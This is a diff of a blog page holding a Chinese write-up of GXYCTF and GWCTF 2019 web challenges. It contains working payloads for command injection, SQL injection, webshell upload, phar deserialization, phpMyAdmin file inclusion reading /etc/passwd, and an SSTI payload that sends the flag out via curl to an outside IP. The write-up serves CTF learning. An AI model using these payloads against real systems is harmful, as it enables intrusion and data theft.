@@ -166,7 +166,7 @@
       <div class="py-5 z-depth-3" id="board">
         <div class="post-content mx-auto" id="post">
           <div class="markdown-body">
-            <h1><span id="gxyctf-2019">GXYCTF 2019</span></h1><h3><span id="ping-ping-ping">Ping Ping Ping</span></h3><p>进入题目后，提示了  <code>/?ip=</code>，于是加上参数 <code>?ip=1</code>试试看，发现是执行了ping命令：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200219225729621.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>然后尝试：</p>
+            <h1 id="GXYCTF-2019"><a href="#GXYCTF-2019" class="headerlink" title="GXYCTF 2019"></a>GXYCTF 2019</h1><h3 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h3><p>进入题目后，提示了  <code>/?ip=</code>，于是加上参数 <code>?ip=1</code>试试看，发现是执行了ping命令：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200219225729621.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>然后尝试：</p>
 <pre><code>?ip=;ls
 </code></pre><p><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200219225758362.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>发现成功执行了命令，但是当读取 flag.php 时，发现过了空格，尝试下面两种绕过方式</p>
 <pre><code>${IFS}
@@ -177,7 +177,7 @@ $IFS$9
 </code></pre><p>（2）我们发现代码中没有过滤反引号，那么可以内联执行命令，即用反引号内执行的输出作为另一个命令的输入执行，payload如下：</p>
 <pre><code>?ip=;cat$IFS$9`ls`
 </code></pre><p>flag在源码中：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200219230600490.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br></p>
-<h3><span id="禁止套娃">禁止套娃</span></h3><p>扫目录发现.git泄露，利用GitHack得到index.php源码如下：</p>
+<h3 id="禁止套娃"><a href="#禁止套娃" class="headerlink" title="禁止套娃"></a>禁止套娃</h3><p>扫目录发现.git泄露，利用GitHack得到index.php源码如下：</p>
 <pre><code class="php">&lt;?php
 include &quot;flag.php&quot;;
 echo &quot;flag在哪里呢？&lt;br&gt;&quot;;
@@ -212,7 +212,7 @@ if(isset($_GET[&#39;exp&#39;])){
 <pre><code>?exp=readfile(next(array_reverse(scandir(pos(localeconv())))));
 </code></pre><p><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220000825981.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
-<h3><span id="babysqli">BabySQli</span></h3><p>随手测试，通过回显可以发现存在 admin 账号，应该是通过注入登录 admin 账号，同时得到一段提示，先base32再base64如下：</p>
+<h3 id="BabySQli"><a href="#BabySQli" class="headerlink" title="BabySQli"></a>BabySQli</h3><p>随手测试，通过回显可以发现存在 admin 账号，应该是通过注入登录 admin 账号，同时得到一段提示，先base32再base64如下：</p>
 <pre><code class="sql">select * from user where username = &#39;$name&#39;
 </code></pre>
 <p>尝试一般的万能密码，发现被过滤了，既然提示了我们sql语句，那么肯定是要根据sql语句来构造，于是猜测：</p>
@@ -225,7 +225,7 @@ if(isset($_GET[&#39;exp&#39;])){
 <p>从而实现了任意密码登录，可以得到flag：</p>
 <p><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220004941525.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
-<h3><span id="babyupload">BabyUpload</span></h3><p>进入题目后，直接是一个上传页面，经过测试发现：</p>
+<h3 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a>BabyUpload</h3><p>进入题目后，直接是一个上传页面，经过测试发现：</p>
 <ul>
 <li>过滤了MIME只能为：<code>image/jpeg</code></li>
 <li>黑名单过滤了文件后缀不能为php</li>
@@ -239,7 +239,7 @@ if(isset($_GET[&#39;exp&#39;])){
 <pre><code>?cmd=readfile(&#39;/flag&#39;);
 </code></pre><p><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220172014685.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
-<h3><span id="babysqliv30">BabysqliV3.0</span></h3><p>首先是一个登录，使用弱密码 <code>admin/password</code> 即可成功登录，登陆后如下：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220173341333.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<h3 id="BabysqliV3-0"><a href="#BabysqliV3-0" class="headerlink" title="BabysqliV3.0"></a>BabysqliV3.0</h3><p>首先是一个登录，使用弱密码 <code>admin/password</code> 即可成功登录，登陆后如下：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220173341333.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>且url中有 <code>?file=upload</code> 参数，于是尝试文件包含:</p>
 <pre><code>?file=php://filter/convert.base64-encode/resource=upload
 </code></pre><p>得到 upload.php 源码如下：</p>
@@ -308,7 +308,7 @@ if(isset($_FILES[&#39;file&#39;])) {
 }
 ?&gt;
 </code></pre>
-<h5><span id="解法一非预期解">解法一（非预期解）</span></h5><pre><code class="php">if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;, $_GET[&#39;name&#39;])){ 
+<h5 id="解法一（非预期解）"><a href="#解法一（非预期解）" class="headerlink" title="解法一（非预期解）"></a>解法一（非预期解）</h5><pre><code class="php">if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;, $_GET[&#39;name&#39;])){ 
     $this-&gt;Filename = $_GET[&#39;name&#39;]; //文件名可控
 }else{
     $this-&gt;Filename = $sandbox.$_SESSION[&#39;user&#39;].$ext;
@@ -318,7 +318,7 @@ if(isset($_FILES[&#39;file&#39;])) {
 <p>中一种就是直接上传shell，然后通过参数name修改文件名问php文件，直接访问即可。<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220195949176.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>然后：</p>
 <pre><code>?cmd=system(&#39;cat ../../flag.php&#39;);
 </code></pre><p><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220200038384.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
-<h5><span id="解法二phar反序列化">解法二（phar反序列化）</span></h5><p>实际上这道题的预期解是通过phar反序列化，也就是利用了 file_get_contents() 函数来实现反序列化。</p>
+<h5 id="解法二（phar反序列化）"><a href="#解法二（phar反序列化）" class="headerlink" title="解法二（phar反序列化）"></a>解法二（phar反序列化）</h5><p>实际上这道题的预期解是通过phar反序列化，也就是利用了 file_get_contents() 函数来实现反序列化。</p>
 <p><code>file_get_contents()</code> 函数的参数是 <code>Uploader()</code> 类的一个对象，因此作为参数时会调用它的 <code>__toString()</code> 方法从而返回 <code>$this-&gt;Filename</code>，而这个 <code>Filename</code> 是我们可控的。</p>
 <p>还注意到上传文件的默认文件名是用 <code>$_SESSION[&#39;user&#39;]</code>设置，因此我们随意上传一个文件就可以得到token的值了。</p>
 <p>脚本如下：</p>
@@ -345,7 +345,7 @@ class Uploader{
 </code></pre>
 <p>将得到的phar文件上传得到路径：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220205115948.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>然后再次上传文件并加上参数 name 从而除法phar发序列化：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220205146715.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
-<h3><span id="strongestmind">StrongestMind</span></h3><p>进入页面后，发现如下算式：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220205428175.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>看来需要写个脚本提交一千次正确答案，脚本如下:</p>
+<h3 id="StrongestMind"><a href="#StrongestMind" class="headerlink" title="StrongestMind"></a>StrongestMind</h3><p>进入页面后，发现如下算式：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220205428175.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>看来需要写个脚本提交一千次正确答案，脚本如下:</p>
 <pre><code class="python">import requests
 import re
 
@@ -369,11 +369,11 @@ print(r.text)
 <p>中间用While循环来提交请求是因为在 BUUCTF 平台上面跑的，没隔一段时间就会返回一次404好像…原题应该没必要这样</p>
 <p>结果如下：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220215520729.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
-<h1><span id="gwctf-2019">GWCTF 2019</span></h1><h3><span id="我有一个数据库">我有一个数据库</span></h3><p>扫描目录可以发现 phpadmin，经过搜索，这里是CVE-2018-12613，可以直接使用vulhub里的poc：<a href="https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md</a></p>
+<h1 id="GWCTF-2019"><a href="#GWCTF-2019" class="headerlink" title="GWCTF 2019"></a>GWCTF 2019</h1><h3 id="我有一个数据库"><a href="#我有一个数据库" class="headerlink" title="我有一个数据库"></a>我有一个数据库</h3><p>扫描目录可以发现 phpadmin，经过搜索，这里是CVE-2018-12613，可以直接使用vulhub里的poc：<a href="https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md</a></p>
 <pre><code>/phpmyadmin/?target=db_sql.php%253f/../../../../../../../../etc/passwd
 </code></pre><p><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200223180137503.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>成功包含，然后直接读取根目录下的/flag，即可：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200223180213855.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
-<h3><span id="枯燥的抽奖">枯燥的抽奖</span></h3><p>进入题目后，让猜字符串，通过js代码可以看到结果是发送的check.php，访问如下：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200223180534106.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>代码审计发现这里是考php的随机数种子爆破，参考2018SWPUCTF的一题：<a href="https://xz.aliyun.com/t/3656#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/3656#toc-3</a></p>
+<h3 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h3><p>进入题目后，让猜字符串，通过js代码可以看到结果是发送的check.php，访问如下：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200223180534106.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>代码审计发现这里是考php的随机数种子爆破，参考2018SWPUCTF的一题：<a href="https://xz.aliyun.com/t/3656#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/3656#toc-3</a></p>
 <p>先使用如下脚本转换随机数：</p>
 <pre><code class="python">str1=&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;
 str2 = &#39;aefhPEHpRX&#39;
@@ -401,7 +401,7 @@ for ($i = 0; $i &lt; $len1; $i++) {
 echo $str;
 </code></pre>
 <p><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200224095812106.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
-<h3><span id="你的名字">你的名字</span></h3><p>进入题目后输入名字会进行回显，虽然是index.php的路由，但是从返回头可以看出是python的后端，那么就很想是SSTI了：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/2020030300064278.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>经过测试，过滤了{{}}，只要使用就会报错，既然只能使用{% %}语句，那么很显然就需要盲注，我们构造payload如下：</p>
+<h3 id="你的名字"><a href="#你的名字" class="headerlink" title="你的名字"></a>你的名字</h3><p>进入题目后输入名字会进行回显，虽然是index.php的路由，但是从返回头可以看出是python的后端，那么就很想是SSTI了：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/2020030300064278.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>经过测试，过滤了{{}}，只要使用就会报错，既然只能使用{% %}语句，那么很显然就需要盲注，我们构造payload如下：</p>
 <pre><code class="python">{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].os.system('执行的命令') %}1{% endif %}
 </code></pre>
 <p>但是经过测试，<code>if</code>、<code>os</code>、<code>class</code>、<code>mro</code> 这些关键词会被替换为空，发现<code>config</code>也会被替换为空，这样我们就可以使用<code>iconfigf</code>、<code>oconfigs</code>的方式进行绕过，我们可以利用curl命令将执行结果带出（在BUUCTF里开一台内网的主机来操作），payload如下：</p>
@@ -413,7 +413,7 @@ echo $str;
 {% iconfigf ''.__clconfigass__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.__globals__['linecache'].oconfigs.system('curl http://174.0.225.32/?a=`cat /flag_1s_Hera|base64`') %}1{% endiconfigf %}
 </code></pre>
 <p><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200303001628802.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
-<h3><span id="mypassword">mypassword</span></h3><p>进入题目后，先注册一个账号并登录：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/2020030315550142.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>只有两个功能，在FeedBack页面提交反馈和在List页面列出并查看已提交的反馈（List页面虽然有id参数，但是根据测试和提示，判断并无SQL注入）。</p>
+<h3 id="mypassword"><a href="#mypassword" class="headerlink" title="mypassword"></a>mypassword</h3><p>进入题目后，先注册一个账号并登录：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/2020030315550142.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>只有两个功能，在FeedBack页面提交反馈和在List页面列出并查看已提交的反馈（List页面虽然有id参数，但是根据测试和提示，判断并无SQL注入）。</p>
 <p>在FeedBack页面查看源码，可以看到如下提示：</p>
 <pre><code class="php">if(is_array($feedback)){
     echo &quot;&lt;script&gt;alert(&#39;反馈不合法&#39;);&lt;/script&gt;&quot;;
@@ -444,7 +444,7 @@ foreach ($blacklist as $val) {
 </code></pre>
 <p>我们利用buuctf提供的requestbin进行接收，也可以利用vps接收。</p>
 <p>提交之后等待管理员点击即可，密码就是flag:<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200303183645844.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
-<h3><span id="blog">blog</span></h3><p>进入页面后，首先注册并登录进去，只有一个上传功能，我们看到url中有 <code>page=index</code>参数，于是尝试一下文件包含，但是提示不是admin：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200303192230409.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>于是我们来看这个上传功能，虽然可以上传php文件，但是并没有给出路径，而且上传后会回显文件名，和RCTF 2015 upload一题很类似，于是我们尝试利用文件名进行二次注入。</p>
+<h3 id="blog"><a href="#blog" class="headerlink" title="blog"></a>blog</h3><p>进入页面后，首先注册并登录进去，只有一个上传功能，我们看到url中有 <code>page=index</code>参数，于是尝试一下文件包含，但是提示不是admin：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200303192230409.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>于是我们来看这个上传功能，虽然可以上传php文件，但是并没有给出路径，而且上传后会回显文件名，和RCTF 2015 upload一题很类似，于是我们尝试利用文件名进行二次注入。</p>
 <p>首先测试一下过滤了哪些东西，随便上传一个文件然后抓包改文件名：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200303193417110.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>从文件名可以看到除了or以外都被替换为空了：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200303193446781.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>除此之外还过滤了一些其他关键词，不过经测试都可以用双写来绕过的，空格用嵌套括号绕过。</p>
 <p>于是我们先构造一个payload如下，原理可以参考我RCTF那道题的<a href="https://lethe.site/2019/05/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/#upload%EF%BC%88rctf-2015%EF%BC%89">Writeup</a>。</p>
 <pre><code>&#39;+(selselectect(conv(hex(substr(database(),1,5)),16,10)))+&#39;
